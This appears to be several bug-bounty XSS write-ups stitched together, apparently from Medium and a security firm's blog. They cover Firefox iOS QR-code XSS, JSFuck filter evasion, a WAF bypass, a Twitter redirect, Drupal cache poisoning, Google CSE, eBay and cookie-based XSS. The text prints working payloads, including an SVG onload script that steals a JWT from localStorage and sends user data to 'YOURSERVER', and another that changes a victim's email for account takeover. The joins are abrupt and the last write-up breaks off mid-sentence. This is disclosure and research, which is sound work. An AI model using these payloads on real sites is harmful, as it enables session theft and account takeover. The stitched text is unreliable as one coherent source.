mode is a feature implemented in most of the browsers that allow users to read articles in a clutter-free view i.e rendering a page in a way that will be easy to read without any distraction. During the rendering process, browsers remove all unnecessary code, like javaScript, iframes, other embedding elements etc to make sure there will be no advertisement or any interruption while being in the reading mode. I tried the same exploit while the document rendered in the reader mode and it worked as demonstrated in the below image Did you noticed the javascript code executed in reference to http://localhost:6571 and if you check window.location.href it will be http://localhost:6571/reader-mode/page?url=https://wwww.anysite.com Now basically you can you add any URL in the last which makes another vulnerability that allows firefox to put any website in the reader mode even though the reading mode is not available for the particular website. You can also look for other possible attack vectors here XSS In Local Files Next, we can try the same attack in local files as well, that too worked fine for us as demonstrated in the below image. One more thing that we can do here is we can also load the local files by making QR code with local file URI like file:///test.html XSS In Internal Pages Apart from domains, reader mode and local files we can also XSS internal pages of browser in case of firefox they run under internal:// pseudo-protocol. CSP Bypass It turns out this vulnerability also bypass the CSP Let’s suppose a website only allowing content that comes from the site’s own content as given below // test.php <?php header(\"Content-Security-Policy: default-src 'self'\"); if(isset($_GET['xss'])) { echo $_GET['xss']; } ?> even if you are on test.php our javascript code will be executed without any restrication. Other sources Next, I have tried to find other sources as well, and I found that we can search selected text using the same or other browsers. Here also if the selected text is javascript URI Firefox will execute javascript code instead of searching it on the default search engine. This particular vulnerability was not useful because the javascript code executed in reference to a blank domain which is harmless as demonstrated in the below image. But still, we can navigate the user to other malicious websites. Other browsers Apart from Mozilla, Opera mini for IOS devices was also affected, We have reported this vulnerability to opera but they have not responded back to us. Root cause Till the version 19 firefox was supporting javascript URI from the address bar, we can check from the source code firefox-ios/BrowserViewController+WebViewDelegates.swift at v19.x · mozilla-mobile/firefox-ios · GitHub After reporting this bug firefox has removed javascript URI support from the address bar, as we can see here firefox-ios/BrowserViewController+WebViewDelegates.swift at master · mozilla-mobile/firefox-ios · GitHub Advisiory: https://payatu.com/advisory/firefox-ios-qr-code-reader-xss Subscribe to our Newsletter Subscription Form Δ Subscribe Research Powered Cybersecurity Services and Training.

We founded a vulnerable section on a site, with some sort of google analytics code, vulnerable to a URL XSS. http://website.com/dir/subdir And inside the javascript code: function(\"/DIR/SUBDIR\",params); Burp suite discovered, that adding “-alert(1)-” at the end of the URL (http://website.com/dir/subdir/”-alert(1)-”, would be reflecting the XSS Press enter or click to view image in full size and browser telling us unable to find function ALERT(1), the GET parameter is getting uppercased :( So we started testing things to see what is filtered from the server: </script>, //, \\, . [dots] aren’t available for use. But we can use everything else “,’,[,],{,} Ok, now what? Let's find a payload that can work. We ended up with a few solutions all related to the jsfuck.com one. It was perfect no dots but very long. Jsfuck from Martin Kleppe Also in hackerone if you can execute an alert(1), is just a Low severity XSS, we wanted to escalate this vulnerability to High or Critical, which can be done with loading an external JS file that executes arbitrary web actions without the user interaction. This is a WordPress payload, our goal was to load an external JS with something like this for this website, changing account password or email. continuing to JsFuck payloads, a simple alert(1) got converted to: \"-%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!!%5B%5D%2B!!%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B%2B!!%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%5D%5B(%5B%5D%2B%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!!%5B%5D%2B!!%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B%2B!!%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%5D)%5B!!%5B%5D%2B!!%5B%5D%2B!!%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!!%5B%5D%2B!!%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B%2B!!%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%5D)%5B%2B!!%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(%5B%5D%5B%5B%5D%5D%2B%5B%5D)%5B%2B!!%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!!%5B%5D%2B!!%5B%5D%2B!!%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!!%5B%5D%5D%2B(%5B%5D%5B%5B%5D%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B%5D%2B%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!!%5B%5D%2B!!%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B%2B!!%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%5D)%5B!!%5B%5D%2B!!%5B%5D%2B!!%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!!%5B%5D%2B!!%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B%2B!!%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%5D)%5B%2B!!%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!!%5B%5D%5D%5D((!!%5B%5D%2B%5B%5D)%5B%2B!!%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!!%5B%5D%2B!!%5B%5D%2B!!%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B%5D%5B%5B%5D%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!!%5B%5D%5D%2B(%5B%5D%5B%5B%5D%5D%2B%5B%5D)%5B%2B!!%5B%5D%5D%2B(!%5B%5D%2B%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!!%5B%5D%2B!!%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B%2B!!%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%5D)%5B!!%5B%5D%2B!!%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B%2B!!%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!!%5B%5D%2B!!%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B!!%5B%5D%2B!!%5B%5D%2B!!%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!!%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D)()(%2B!!%5B%5D)-\" That’s dope, pretty ugly and LONG. If i wanted to alert(document.cookie) its above 13000 characters long, I figured out that after 2500–2700 characters the webserver started returning Error 400 . So we started investigating how jsfuck works. const SIMPLE = { 'false': '![]', 'true': '!0', 'undefined': '0[0]', 'NaN': '+[!0]', 'Infinity': '+(+!0+(!0+[])[!0+!0+!0]+[+!0]+[0]+[0]+[0])' // +\"1e1000\" }; const CONSTRUCTORS = { 'Array': '[]', 'Number': '(+0)', 'String': '([]+[])', 'Boolean': '(!0)', 'Function': '[][\"fill\"]', 'RegExp': 'Function(\"return/\"+0+\"/\")()' }; const MAPPING = { 'a': '(false+\"\")[1]', 'b': '([][\"entries\"]()+\"\")[2]', 'c': '([][\"fill\"]+\"\")[3]', 'd': '(undefined+\"\")[2]', 'e': '(true+\"\")[3]', 'f': '(false+\"\")[0]', 'g': '(false+[0]+String)[20]', 'h': '(+(101))[\"to\"+String[\"name\"]](21)[1]', 'i': '([false]+undefined)[10]', 'j': '([][\"entries\"]()+\"\")[3]', 'k': '(+(20))[\"to\"+String[\"name\"]](21)', 'l': '(false+\"\")[2]', 'm': '(Number+\"\")[11]', 'n': '(undefined+\"\")[1]', 'o': '(true+[][\"fill\"])[10]', 'p': '(+(211))[\"to\"+String[\"name\"]](31)[1]', I started trying to execute part of this on Chrome, to see how it works. so basically, we can scrap strings from the different type of vars, so we can get the lowercase letters from false, true, undefined, NaN, Infinity, etc. So I managed to get the whole abecedary without using lowercase letters. Á=![]; //false É=!![]; //true Í=[][[]]; //undefined Ó=+[![]]; //NaN SI=+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]]);// Infinity ST=([]+[]); // Ü=(+[]); A=(Á+\"\")[1]; D=(Í+\"\")[2]; E=(É+\"\")[3]; F=(Á+\"\")[0]; G=[![]+[+[]]+[[]+[]][+[]][[![]+{}][+[]][+!+[]+[+[]]]+[[]+{}][+[]][+!+[]]+[[][[]]+[]][+[]][+!+[]]+[![]+[]][+[]][!+[]+!+[]+!+[]]+[!![]+[]][+[]][+[]]+[!![]+[]][+[]][+!+[]]+[[][[]]+[]][+[]][+[]]+[![]+{}][+[]][+!+[]+[+[]]]+[!![]+[]][+[]][+[]]+[[]+{}][+[]][+!+[]]+[!![]+[]][+[]][+!+[]]]][+[]][!+[]+!+[]+[+[]]]; I=([Á]+Í)[10]; L=(Á+\"\")[2]; T=(É+\"\")[0]; O=(É+[][F+I+L+L])[10]; R=(É+\"\")[1]; N=(Í+\"\")[1]; M=(+(208))[T+O+\"S\"+T+R+I+N+G](31)[1]; P=(+(211))[T+O+\"S\"+T+R+I+N+G](31)[1]; S=(Á+\"\")[3]; U=(Í+\"\")[0]; V=(+(31))[T+O+\"S\"+T+R+I+N+G](32); X=(+(101))[T+O+\"S\"+T+R+I+N+G](34)[1]; Y=(Ó+[SI])[10]; Z=(+(35))[T+O+\"S\"+T+R+I+N+G](36); C=([][F+I+L+L]+\"\")[3]; H=(+(101))[T+O+\"S\"+T+R+I+N+G](21)[1]; K=(+(20))[T+O+\"S\"+T+R+I+N+G](21); W=(+(32))[T+O+\"S\"+T+R+I+N+G](33); J=([][E+N+T+R+I+E+S]()+\"\")[3]; B=([][E+N+T+R+I+E+S]()+\"\")[2]; Also i was needing slashes and DOT, i was able to get the DOT from 1.1e+101 float value. awesome we got the dot, now I was missing “/” and “g” because the uppercase filters so I decided to jsfuck do the work for me I was sacrificing 1200 chars but this payload was about 500–800 so I was in the 2400–2600 range from the http request. Now that I have all chars is the fun part. Execution Execution Execution.

So let's get back to business..As i was investing the XSS issue on the platform i noticed that the XSS Popup was triggered TWO times on the homepage. So i searched for the endpoint where the XSS payload got executed. But no luck, So i removed my payload from the first vulnerable endpoint that is the Alternate Url Text and checked the homepage. To my suprise the XSS pop triggered as usual but this time it pop’d up only ONCE . So i look up the macro if i had entered the payload anywhere else and of course i had entered a payload on the macro description field . So i found an another vulnerable endpoint. Time for POC. For POC purposes i created a fresh macro and entered the payload on the macro description field and click on save…A Web Application Firewall(WAF) came smiling upon me Saying “ YOU HAVE BEEN BLOCKED”. WAF BYPASS TIME!!!!!!!!!!!!!!! After learning about the working of the WAF i found out a “Not so Complicated” Method to bypass It. Don't Enter the payload in beginning itself while creating the macro. Instead while creating the macro just enter random things in the description and after creating the macro edit the description and enter the payload. Shorter version : WAF only scans the content that is entered the first time and does not care what you enter afterwards . Press enter or click to view image in full size After this BYE BYE WAF. The payload got saved successfully and also got triggered on the homepage. Report Timeline : Aug 10th- Report Submitted Aug 11th- Closed as duplicate of my first report Aug 17th- Report reopened after providing info that the two xss issues are different Aug 23rd- Bounty Time $$$ Aug 26th- Resolved and Got listed on their HOF Few Things to Say.. Check the number of XSS triggers ( Number of XSS triggers = Number of Vulnerable endpoints) Try to Bypass the WAF by not only changing the payload. 3.

I think that in the process of finding the vulnerability, there are some interesting knowledge points, I hope you can get some from my writeup. If you want to know more details, you need to visit bobrov’s blog , my discovery is due to reading his writeup, and thanks bobrov very much,I have a lot of gains from his blog. Maybe you don’t want to spend more time. Here I will give a brief explanation of his article. When you visit some addresses, the server returns 302, which is similar to the following picture. Press enter or click to view image in full size In the returned Body, location will choose how to populate according to the requested URL,and the requested URI will be placed in the href event. What do you think of next? Can we try it with dev.twiiter.com//javascript:alert(‘1’);/ indeed, as you might expect, <a href=”javascript:alert(‘1’);/”> Xxx</a> will be in the return body,but the returned location is location:javascript:alert(‘1’);/ ,The browser does not play the box So, bobrov did a lot of fuzz, trying to get around the limitations here, amazing, he did, his Fuzz process is as follows (taken from his blog) Press enter or click to view image in full size So, his final Payload is https://dev.twitter.com//x:1/:///%01javascript:alert(document.cookie) and the response from the server is as follows.Location header = //aa :1/:/dev.twitter.com/%01xxx . returned body = <a Href=”javascript:alert(document.cookie)”>xxx</a>. Seeing this, you may be wondering, is this a problem?Javascript only works when the a tag is clicked,and the location header is http:////aa:1/:/dev.twitter.com/%01xxx, does the browser not jump? There is a key point in this.When you visit a website, usually, the port you access is 80 or 8080,if you enter the port address as 1, the browser will not jump.Here, it is the a tag. The click was made possible, so we can combine the issue via Clickjacking,let the victim trigger this XSS vulnerability After introducing his findings, let me talk about how I found this problem again.Honestly, I have been paying attention to Twitter security for a while,but I have gained very little,so I put my eye on Twitter’s past vulnerability report to see if there are some problems in the Twitter fix. When I saw bobrov writeup about the problem,I immediately visited dev.twtter.com to try to find out if there were some problems.When I collected information through Google, I found an extremely interesting link. https://dev.twitter.com/web/sign-inhttps://dev.twitter.com/basics/adding-international-support-to-your-apps Look closely, do you find it interesting? My feeling tells me that there may be problems here.So I tried to go to Fuzz to confirm my guess.After a period of testing, I found that when I added a / at the end of the URL,a miracle happened, for example,when I visited https://dev.twitter.com/web/sign-inhttps://dev.twitter.com/http://www.bywalks.com/, location= http://www.bywalks.com ,href= http://www.bywalks.com Yes,Twitter’s fix for this issue no longer exists. Finally,after a period of Fuzz, my final Payload was https://dev.twitter.com//web%2f:1/:///%01javascript:alert(1)/ and I got Twitter 1120$ rewards My gains in the process: 1: Don’t give up on the exploitation of a large company’s loopholes, insist that there will always be gains 2: When accessing a 302 jump page, location header and link on page extracting Url in different ways, there may be problems here. 3: When the browser tries to access a website with a port of 1, it will not jump I hope that you can make some gains from my writing and sorry I m a non English speaker best wishes, Bywalks Twitter Bug Rewards Programs Xss Attack -- -- 2 Written by Bywalks 63 followers · 2 following Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

You can try to debug how the developer might have coded a certain functionality or how he might have configured his application, especially in the case where the application is built in some framework or CMS . For example, many developers using Rails framework use Scaffold to quickly generate major pieces of application like model, views and controller in a single operation. Besides this, Scaffold also creates JSON API endpoint for each route automatically which is most of the time overlooked by the devs or they forgot to remove this JSON endpoint while pushing to production. So a dev who removed sensitive information from a normal route, might forget to remove the same from JSON endpoint of that route. Checking such misconfiguration might leak some sensitive data in a rails application. Therefore, having knowledge about the application technology really gives you differential findings than others. Recently, I came across a Drupal application in a bug bounty program on Hackerone. Since I’ve used drupal before, I started looking for some common misconfigurations related to drupal. And within 10 minutes, I found one. If you’ve developed on drupal before, you might know that it has it’s own internal caching system which is enabled by default . Easiest way to find whether caching is enabled is to look for x-drupal-cache header in the response. So you give unique key( endpoint + parameters ) in request and in response you get x-drupal-cache: MISS header but if you request again with that same key and you get x-drupal-cache: HIT header in the response, caching is enabled. To learn more about how caching works and its exploitation, read this by albinowax . After I came to knew that caching is enabled, one of the ways I can exploit is by poisoning the cache with XSS payload. But to do that I need to find an HTTP header that gets reflected in the response. Since drupal just like any other PHP framework sometimes supports X-Original-URL and X-Rewrite-URL headers because of Zend , I tried injecting these headers in request but sadly the application wasn’t accepting. What to do now? If nothing works, try brute-forcing . So I used a burp suite extension called Param Miner which will brute force common headers. After few seconds I got a hit. It found a header named style which was getting reflected in response. I quickly checked whether it’s vulnerable to XSS and it was. After that, I knew I can easily chain cache poisoning to stored XSS. I created a unique key & added style header with XSS payload and fired the request. Press enter or click to view image in full size The response with XSS payload is cached for the above unique request. Now whenever someone visits www.redacted.com/?q=admin&liec4897=1, our poisoned response will be served by drupal resulting in Stored XSS. That’s it. A simple drupal misconfiguration leads to Stored XSS.

It can be a person, bounty, write-up or anything. In my case the inspiration was Google Vulnerability Research Grant that was rewarded to me prior to BountyCon 2019. I started looking for subdomain and landed in https://cse.google.com . Google CSE (Custom Search Engine) gives you ability to create your own custom search engine for your website. Once you have created the custom search engine, you can view it with the following link. https://cse.google.com/cse?cx =<YOUR_ID>. It also allows you to add your own promotion URL to your custom search engine ( https://cse.google.com/cse/search/promotions?cx =<YOUR_ID> ). When the user search the promotion triggering keywords the ad URL will appear in top of search, just like Google. Now all you have to do now is add the most classic “ javascript:alert(0 )” to the promotion URL. Luckily it didn’t get filtered. So once you search the keyword and click on the promotion URL the alert will popup. Still complicated to exploit,as user want to enter the promotion triggering query manually. So did a bit of parameter guessing and it worked . https://cse.google.com/cse?cx =<YOUR_ID>?q=triggeringkeyword will automatically search the payload for you. Now all you have to do is, send the URL to the victim and he have to click on the promotion. TAAATAAAhh! XSS firesss!

Why writing it up now? Because I didn’t want to “showoff” for reasons. Enough with the drama :D. Let’s get to the point. So I was looking at all the names in Hall of fame of different sites. On Ebay’s Security Researcher page, I thought the list is long but I want my name in the list. So I started playing with all the GET parameters and came to this possibly vulnerable page. URL: http://www.ebay.in/sch/Coins-Notes-/11116/i.html Vulnerable parameter: LH_SpecificSeller Reflected Code: <span style=\"display:none\"> <span title=' XSS HERE '> XSS HERE </span> </span> List of hurdles: < > and , are removed Affected area lies within hidden span ( display: none , no mouse events) Because parent span had CSS style display: none , it was not possible to trigger event. Neither it was possible to make the affected span visible because of the same reason. Though I tried it by adding style attribute. I tried all other payload, say it be onload / onerror events or data: URI in style attribute. But after a little research; OK OK after 8 hours of research I came upon a CSS expression payload . http://www.ebay.in/sch/Coins-Notes-/11116/i.html?LH_SpecificSeller=1..xss'+style=\"xss:expression(prompt(1))\"+id='1 Press enter or click to view image in full size Aaand it worked!

While thinking some words to make a report, I was thinking to create XSS payload in markdown editor (but I didn’t expect to be an XSS issue). At the end of my report, I added a XSS Payload : Cheers, [Schopath](https://schopath.ninja/\"/onmouseover=\"alert(/schopath/)\"/x=\"ZeroByte.ID) Then, I submit my report. What the … Boom! Gotcha! Really? It’s work! and I still don’t believe it. So many reports entered in that platform, only me who tried this? Debugger (F12) Press enter or click to view image in full size View Source (CTRL + U) Oh no, I’m just lucky kid After that, I started to create my P2 submission. Bonus!

This site was mainly for the purpose of group purposes so companies can share their data among other peoples and can invite other people having account on this site.During the initial testing I was looking for random bugs like csrf,xss,session misconfigs etc. And soon I found a stored xss bug. There was a functionality on the site to create some kind of mindmaps where we can store data for different purposes for memory recalling. And there were some templates to do this. And this was the request which got issued during creation of them, POST /endpoint Site: example.com {“tag1\":”abc”,”tag2\":”def”,”html”:”<div>blabla”} And this div took my attention, and I added a simple html tag like <b>test</b> and it rendered it properly. Now I tried something like <script>alert(6)</script> , it doesnt executed. Well xss can be executed in other ways as well using <image>,<iframe>,<svg> etc. I tried <image src=x onerror=alert(5)/> and alert popped up. And because of excitement of stored xss I reported this and this was the reply from them after 15 days. Press enter or click to view image in full size Woah! really! then how the pop-up came.I didnt want to argue much and start chaining it with other bugs I found on the site. There was a jwt token used as a csrf protection in the every sensitive requests which got changed after every 600 seconds I guess. Very secured right? Now the jwt tokens were stored not in cookies but in local html storage. Now the hacker inside me arised and I thought cant this be chained with the xss I found earlier to steal users information and I quickly remembered xmHttpRequest . Now as we can add javascript in onload handler of svg tags I prepared a quick poc to steal users information by first stealing jwt token from html storage and then adding it to auth request headers in the xmlhttprequest and this was my payload after some searching on xmlhttprequest and fetch api, POST /endpoint Site: example.com {“tag1”:”abc”,”tag2\":”def”,”html”:”<svg onload=\\”var token=localStorage.getItem(‘jwt’);var xhr=new XMLHttpRequest();xhr.open(‘GET’,’https:/example.com/api/v0/endpoint/’, true);xhr.setRequestHeader(‘Accept’, ‘application/json’);xhr.setRequestHeader(‘Content-Type’,’application/json; charset=utf-8');xhr.setRequestHeader(‘Authorization’, ‘Bearer ‘ + token);xhr.send();xhr.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { alert(xhr.responseText); fetch(‘ https://YOURSERVER?q='+xhr.responseText);}};\\ \"/>\"} What this does is steals jwt token from local storage, make a xmlhttprequest to sensitive endpoint append the Authorization header(i,e jwt ) that was stolen, and sends the response with users sensitive information to our server through fetch api. But the hacker inside in me was not satisfied and I want to do a full account takeover. I though lets try. And from my initial testing I know that the application doesnt asks for password during email change and made a PATCH request like this with the auth header in request PATCH /email-change {“email”:”x@x.com”} As PATCH requests are allowed in xmlhttprequest I though lets give it a try. Now the real struggle came in. Firstly I want to tell you that in this PATCH request we require json data. And from above first payload you will see that the POST request itself contains a json payload. POST /endpoint Site: example.com {“tag1”:”abc”,”tag2\":”def”,”html”:”<PAYLOAD>”} New payload : <svg onload=\\”var token=localStorage.getItem(‘jwt’);alert(token);var xhr=new XMLHttpRequest();xhr.open(‘PATCH’,’https://site.com/v0/user', true);xhr.setRequestHeader(‘Accept’, ‘application/json’);xhr.setRequestHeader(‘Content-Type’,’application/json; charset=utf-8');xhr.setRequestHeader(‘Authorization’, ‘Bearer ‘ + token);var body= ’{“email”:”x@x.com”}’ ;xhr.send(parsed);xhr.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { alert(xhr.responseText) }};\\”/> Elaborating more when I made this request with our payload in it, you will notice that first our whole payload is in html parameter of original json which is in and must be in double quotes(property of json), and inside that we have the svg payload which have onload handler which also have double quotes(ok, we will escape it with backslash), but there is also a PATCH request for the account takeover which have json data(double quotes necessary right) but we already have escaped double quotes outside in onload handler,(you must be thinking escape it with two backslash simple, ok done) now the site accepted the data but when I visited this place where stored xss was the PATCH request was not issued from xss probably because of two backslashes in json data. In console it was saying “literal contains an unescaped line break”. This is where I struggled for two days. WHAT WERE THE PROBLEMS I WAS FACING : Whenever I send a single quote in the json data of PATCH request inside onload handler the request failed saying “invalid json” Whenever I send a double quote in the json data of PATCH request inside onload handler the request accepted but the PATCH request in real xss failed. Now I was stuck from both the ends. I tried many different things and a lot of googling, stackoverflowing about this but was still unsuccessful and was always facing one of the two above problems. I even tried implementing single quoted json to convert it to double quoted during the run like this var body = {‘email’:’’x@x.com} body.replace(/’/g, ‘“‘) But this also failed as it also required the double quotes in replace function. I felt like quitting here. EVAL COMES TO THE RESCUE After 2 days and some more googling I found out there also a way to make single quoted json into double quoted json with eval. So you can convert single quoted json to double quoted json with eval without using double quotes anywhere, var test = {‘a’:’b’}; var new = eval(‘(‘ + test + ’)’); and then I felt I am prettly close, I made the new payload which have single quoted data inside body parameter and the evl function convert it to double quotes and then we <svg onload=\\”var token=localStorage.getItem(‘jwt’);var xhr=new XMLHttpRequest();xhr.open(‘PATCH’,’https://example.com/api/v0/user', true);xhr.setRequestHeader(‘Accept’, ‘application/json’);xhr.setRequestHeader(‘Content-Type’,’application/json; charset=utf-8');xhr.setRequestHeader(‘Authorization’, ‘Bearer ‘ + token);var body= ’{\\\\’email\\\\’:\\\\’x@x.com\\\\’}’;str = eval(‘(‘ + body + ‘)’);var parsed=JSON.stringify(str);xhr.send(parsed); xhr.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { alert(xhr.responseText) }};\\”/> and sent the request got accepted. Woah!! passed the first stage, now when I loaded the the page where stored xss was there. The xss executed and no errors in console, I was like I have done that and in within a minute a confirmation email at our attackers email account received to verify the new email address for the account. I was so relaxed at that moment and also very happy at the same time. Finally after trying 100’s of payload and after 3–4 days I got the right payload for full account takeover. Probably I was weak in the basics of json implementation in javascript which took me so much time in making this payload worked, but the struggle was the real part where my hacking instints came up and I was like if this failed I should try this and finally the struggle paid off. Might be the good experts must have found this quickly but I really loved the struggle as it taught me to not give up till you think its possible. Now what this payload does is makes PATCH request to issue a new email for user , whoever visits that mindmap, the xss executes and changes his/her email to the attackers email. Vulnerabilities Chained => Stored xss + Jwt token in html local storage + No password protection on email change Finally they accepted this bug because of the account takeover poc I showed them and was awarded a good bounty by them.Always try to increase the impact of xss by chaining it with other bugs like token stealing,csrf, etc. XSS is more than an alert Thanks, Jatin Twitter : https://twitter.com/techyfreakk JavaScript Bug Bounty Hackerone Web App Security -- -- Written by Jatin Nandwana 131 followers · 1 following Web application pentester No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

Here’s the full content:\n\nСookie-based XSS exploitation | $2300 Bug Bounty story | by Max | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Сookie-based XSS exploitation | $2300 Bug Bounty story Max 8 min read · Jul 17, 2019 -- 1 Listen Share Press enter or click to view image in full size For quite a long time I have been hunting for vulnerabilities on the HackerOne platform, allocating a certain amount of time outside the main work to check out my favorites and new programs. Countless times I had to stumble upon a cookie-based XSS vulnerability, which will become the main character of this article. This type of vulnerability occurs when the value of the cookie parameter is reflected on the page. By default, they are considered self-XSS if we, in our turn, do not prove their danger. Today I will tell you how to exploit cookie-based XSS vulnerabilities, and also give an example from one company testing, from which I received $7,300 in general for the research. In order to execute javascript on the user’s side, we need to find a way to set a cookie and, if necessary, lure the victim to a page where, in its turn, the cookie is embedded. Possible ways to exploit this bug: 1. CRLF injection. This vulnerability occurs when there is no proper checking and blocking of newline characters. We can inject a Set-cookie header in the response with the desired name, as well as the value of the cookie and set it in the browser. Real-life example: Slippery CRLF injection on twitter.com domain in the redirect, — https://twitter.com/login?redirect_after_login=/jjjkkk嘊嘍Set-Cookie:jjjjj=a;domain=twitter.com Reports about this type of vulnerability can be read on HackerOne https://hackerone.com/hacktivity?order_direction=DESC&order_field=popular&filter=type%3Apublic&querystring=crlf%20injection . 2. XSS vulnerability on a subdomain. It is necessary that XSS is publicly available and located on wildcard * .vulnerabledomain.com. For many bug bounty programs, subdomains are out of scope, i.e, in most cases, bugs are either not accepted at all, or are accepted but marked as “not eligible for the bounty”. In such cases, you should not retreat, but for the sake of a bunch with cookie-based XSS, you can invest your time searching for XSS to get a reward. If XSS is detected, we can set or remove cookies using the document.cookie function. Increasing Impact: Often the victim trusts the main domain vulnerabledomain.com more than, for example, jira.vulnerabledomain.com, and also with the URL /plugins/servlet/oauth/users/icon-uri?consumerUri=https://maliciousdomain.com. It is more likely that the victim will go to the main domain, rather than a subdomain, if this subdomain is not associated with a personal account or authorization. Based on the foregoing, we can use an in-site redirect functionality for redirecting to the subdomain https://vulnerabledomain.com/login?redirectUrl=https://jira.vulnerabledomain.com/path for the best effect. If the victim has an active session, the redirect will be automatic; — if not, authorization is needed. When the user clicks on such a link, the cookie will be set and from the subdomain, on which Reflected XSS is presented, it can be sent further downstream — to the cookie-based XSS page, where the exploit can trigger, which, in turn, will capture the CSRF token value and perform the request for changing the email address. Thus, a combination of two XSS vulnerabilities can lead to account takeover, if there are no associated problems, such as additional confirmation of changing email with a password or entering a code from an old mailbox. 3. Detection of test files that allow you to set cookies. It is enough to turn on the content discovery tool (dirb, dirserach, etc), start digging, and if the developers forgot to perform the cleanup, you can stumble upon such files. Recently I discovered a test servlet html page on which it was possible to set a cookie with an arbitrary name and value. Of course, there was no protection on the POST request, so if the victim would have visited the CSRF exploit (or you can change the POST to GET), it would be possible to set a cookie in her browser. This bug was qualified as an under-alternative to CRLF injection, fixed by removing /examples/ and paid $150 as for the low-severity bug. Although the h1 triager set medium, the developers were still tended to think that it was low severity. Press enter or click to view image in full size 4. Man in the middle attack (MITM). This method can be applied only if there is no secure flag on the cookie. If you don’t know what this flag is or just want to refresh your memory, I advise you to view the “Cookie security” presentation from OWASP London 2017 https://www.owasp.org/images/a/a0/OWASPLondon20171130_Cookie_Security_Myths_Misconceptions_David_Johansson.pdf . For a successful attack, it is necessary that the victim is located in the attacker’s network or the dns resolving can be influenced. In order to check the vulnerability, you must: 1) to host index.php file with the following content: <?php if ($_SERVER[‘HTTP_HOST’] == ‘non-existed-subdomain.vulnerabledomain.com’) { setrawcookie(“VID”,’\\’+alert(123123123)+\\’’, time() + 36000, “/”, “.vulnerabledomain.com”,0,1); } ?> 2) Add the following line to your /etc/hosts/ file: 127.0.0.1 non-existed-subdomain.vulnerabledomain.com 3) Visit non-existed-subdomain.vulnerabledomain.com and then open the page on which the cookie will be reflected. A remarkable example of MITM exploitation on e.mail.ru, — https://hackerone.com/reports/312548 , — as you can see, MITM was enough to prove a small level of vulnerability danger, but the reward did not match the level of Stored XSS, as there was shown only “local” exploitation example, not “in-the-wild”. If the researcher had spent some time searching for XSS or CRLF injection (which countless) on *.mail.ru, it would be possible to increase the reward greatly. But not all the hackerone programs accept cookie-based XSS via MITM. If scope exclusions say “Self XSS”, then this exploitation can be considered as Self XSS and report status can be changed to informative or n/a, which is not always pleasant. Now I will talk about a similar case that happened to me during the regular hunt on the platform. While testing the site, I suddenly noticed that the value of the **redacted** cookie is reflected in one of the subdirectories of the site. The first thing I checked is the displaying of the characters ’ “/<>. It turned out that only <> characters are filtered, which tells us that we cannot go beyond <script> </ script>, but it also becomes clear that the rest of the characters are not filtered. Without thinking for a long time, we embed ‘-alert(document.domain)-’ and js is executed. Since the developers did not give the cookie the secure flag, in this case the MITM method works. I decided to send the report to the program with the following impact: Press enter or click to view image in full size HackerOne staff (triager) made it clear that this is self-XSS and I should try-harder: Press enter or click to view image in full size After that, I began to surf the site and try to find CRLF injection or XSS to prove the danger. I had to expand the list of the subdomains with the help of brute-force with a large dictionary, scraping them with SSL certificates and with the help of some other tricks. The result was not long in coming, as I run most of the tools in VPS. From time to time other bugs were also found in passing, which I was reporting, turning out-of-scope bugs to in-scope, if necessary. There were a lot of Open Redirects and even Improper Access Control bug for $5000, but the necessary vulnerabilities for the bundle 